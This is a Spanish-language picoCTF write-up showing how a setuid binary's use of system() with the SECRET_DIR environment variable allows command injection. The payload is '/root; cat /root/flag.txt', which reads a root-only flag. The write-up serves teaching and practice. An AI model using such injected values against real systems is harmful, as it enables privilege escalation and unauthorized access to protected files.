# VNE

Este ejercicio nos da las credenciales para acceder por SSH como un usuario en una máquina.

En el directorio inicial encontramos un binario llamado `bin`:

```bash
file bin  
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
```

Si intentamos ejecutarlo, obtenemos un mensaje de error:

```bash
./bin
Error: SECRET_DIR environment variable is not set
```

Si asignamos la variable `SECRET_DIR` al directorio `/root`, por ejemplo, al ejecutar el binario veremos un `ls` del contenido de `/root`:

```bash
export SECRET_DIR="/root"
./bin
Listing the content of /root as root:
flag.txt
```

Podemos ver el archivo `flag.txt`, pero no su contenido.

Podemos usar `strings` sobre el binario para obtener más información. Al hacerlo, observamos la siguiente línea:

```bash
__stack_chk_fail
__cxa_atexit
getenv
system // Ruta relativa
__cxa_finalize
setgid
__libc_start_main
```

El binario parece usar `system` con una ruta relativa. Viendo su comportamiento, podemos suponer que está ejecutando algo como `system('ls SECRET_DIR')`.

Podemos intentar inyectar un segundo comando usando `;` de la siguiente forma:

```bash
export SECRET_DIR='/root; cat /root/flag.txt'
```

Probamos a ejecutar el binario:

```bash
./bin
Listing the content of /root; cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_cdeb2a4d}
```

¡Lo tenemos!
